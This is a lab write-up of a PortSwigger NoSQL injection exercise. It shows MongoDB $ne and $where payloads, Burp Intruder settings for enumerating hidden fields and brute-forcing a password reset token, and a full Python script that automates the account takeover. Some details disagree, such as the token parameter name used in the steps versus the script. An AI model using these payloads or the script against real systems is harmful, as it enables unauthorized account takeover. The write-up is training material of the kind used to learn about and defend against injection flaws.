# 🧪 Field Enumeration to Full Account Takeover with NoSQL Injection

## Exploited a NoSQL injection flaw to enumerate hidden fields and extract a valid password reset token, leading to a seamless account takeover.

![NoSQL New Cover](https://github.com/user-attachments/assets/f22718a8-22b0-48a2-8911-3182a23e5f9d) <br/>


## 📘 Introduction

This lab demonstrates a NoSQL injection vulnerability in a MongoDB-backed login system. By abusing MongoDB operators like `$ne` and `$where`, we can bypass authentication checks, enumerate hidden user fields, and finally extract a password reset token to hijack an account. This step-by-step PoC reveals how NoSQL injections can lead to full account compromise when input validation and query construction are insufficiently secured.

---

## ⚠️ Disclaimer

This material is provided solely for educational purposes on authorized lab environments. Unauthorized testing or exploitation of systems without explicit permission is illegal and unethical. Always practice responsible disclosure and adhere to applicable laws.

---

## 🧩 Step-by-Step PoC

1. Access the [Lab](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields), try to sign in with username `carlos` and any random password, intercept the request with Burp Suite.

![1](https://github.com/user-attachments/assets/5db5158e-0f8e-49d7-bff9-7341434e48df) <br/>

2. Send the intercepted POST `/login` request to Repeater with body:

   ```json
   {
     "username": "carlos",
     "password": "test"
   }
   ```

   Response:

   ```
   Invalid username or password
   ```

![2](https://github.com/user-attachments/assets/b64ff556-c623-479a-86c6-6f19407b42c2) <br/>

3. Try bypass using the MongoDB not equal operator `$ne`:

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" }
   }
   ```

   Response:

   ```
   Account locked: please reset your password
   ```

![3](https://github.com/user-attachments/assets/14a947d6-a252-462f-bf1f-a74e9172ce7f) <br/>

   Although the login is not bypassed, the `$ne` operator is accepted, confirming injection.

4. Add the `$where` parameter as `0` (false):

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" },
     "$where": "0"
   }
   ```

   Response:

   ```
   Invalid username or password
   ```

![4](https://github.com/user-attachments/assets/054028a7-a68c-4b7d-b8b9-3ecd539b11b4) <br/>

5. Change `$where` to `1` (true):

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" },
     "$where": "1"
   }
   ```

   Response:

   ```
   Account locked: please reset your password
   ```

![5](https://github.com/user-attachments/assets/adf73799-5539-4e94-aec2-2f77a01a08e3) <br/>

   This proves the `$where` clause is evaluated and injectable.

6. Enumerate user document fields with Intruder. Use the payload:

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" },
     "$where": "Object.keys(this)[§§].match('^.{}.*')"
   }
   ```

   Attack setup:

   * Attack type: Cluster Bomb
   * Payload position 1 (§§): Numbers, from 0 to 20
   * Payload position 2 (§§): Brute force characters: `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789` (min/max length 1)

   Interpretation:

   * Index 0: `_id` (default)
   * Index 1: `username`
   * Index 2: `password`

![6](https://github.com/user-attachments/assets/3fc45c03-7292-481f-aca4-71980a6aa95b) <br/>

   By incrementing the index, you discover all user fields, including a password reset token.

7. Capture the `GET /forgot-password` request in Proxy. This endpoint is related to password reset.

![7](https://github.com/user-attachments/assets/9e40da66-3ec6-4c12-af84-5dd468ced5a7) <br/>

8. Use Intruder with payload to extract token value:

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" },
     "$where": "this.password.match('^.{}.*')"
   }
   ```

   Extracted token (example):

   ```
   zw81ejagwjes6l1wgpn
   ```

![8](https://github.com/user-attachments/assets/ea9261f8-5b50-4ed0-8f71-933f08298941) <br/>

9. Use the extracted token as a GET parameter in the forgot-password URL:

   ```
   /forgot-password?resetToken=zw81ejagwjes6l1wgpn
   ```

   You can now reset Carlos’s password and log in, solving the lab.

![9](https://github.com/user-attachments/assets/8657356c-43d7-4a89-83e7-64d8cd5aa92e) <br/>

---

## 👨‍💻👩‍💻 Code

```
import requests
from urllib.parse import urljoin
import string

def send_login(base_url, payload):
    url = urljoin(base_url, "/login")
    headers = {'Content-Type': 'application/json'}
    try:
        response = requests.post(url, json=payload, headers=headers)
        return response.text
    except Exception as e:
        print(f"[!] Request error: {e}")
        return ""

def test_ne_injection(base_url):
    payload = {"username": "carlos", "password": {"$ne": "invalid"}}
    response = send_login(base_url, payload)
    return "Account locked" in response

def test_where_clause(base_url):
    test_0 = {"username": "carlos", "password": {"$ne": "invalid"}, "$where": "0"}
    test_1 = {"username": "carlos", "password": {"$ne": "invalid"}, "$where": "1"}
    resp_0 = send_login(base_url, test_0)
    resp_1 = send_login(base_url, test_1)
    return "Invalid username" in resp_0 and "Account locked" in resp_1

def extract_token_value(base_url, token_field, max_length=40):
    print(f"[*] Extracting token value for field: {token_field}")
    token = ""
    for i in range(max_length):
        found = False
        for c in string.ascii_letters + string.digits + "-_":
            test = token + c
            payload = {
                "username": "carlos",
                "password": {"$ne": "invalid"},
                "$where": f"this.{token_field}.match('^{test}.*')"
            }
            response = send_login(base_url, payload)
            if "Account locked" in response:
                token += c
                print(f"[+] Token so far: {token}")
                found = True
                break
        if not found:
            break
    return token

def main():
    base_url = input("Enter Lab URL (e.g. https://YOUR-LAB-ID.web-security-academy.net): ").strip()
    if not base_url.startswith("http"):
        print("[-] Invalid URL format.")
        return

    print("[*] Testing for NoSQL Injection...")
    if not test_ne_injection(base_url):
        print("[-] Injection failed. Target may not be vulnerable.")
        return
    print("[+] $ne injection appears successful.")

    if not test_where_clause(base_url):
        print("[-] $where clause injection failed.")
        return
    print("[+] $where clause is being evaluated.")

    # Use known token field directly
    token_field = "newPwdTkn"

    token_value = extract_token_value(base_url, token_field)
    if not token_value:
        print("[!] Could not extract token value.")
        return

    reset_link = urljoin(base_url, f"/forgot-password?{token_field}={token_value}")
    print(f"\n🎯 Password reset link:\n{reset_link}")
    print("🚀 Paste it in Burp's browser, reset Carlos's password, and solve the lab.")

if __name__ == "__main__":
    main()
```

---

## 👋 Happy Hacking Goodbye Note

Congratulations on mastering this NoSQL injection challenge! Remember, the same techniques that let you exploit vulnerable apps can be used to defend them. Always hack ethically, report responsibly, and keep learning.

Happy hacking and stay curious!
— Aditya Bhatt ☠️🛡️

---
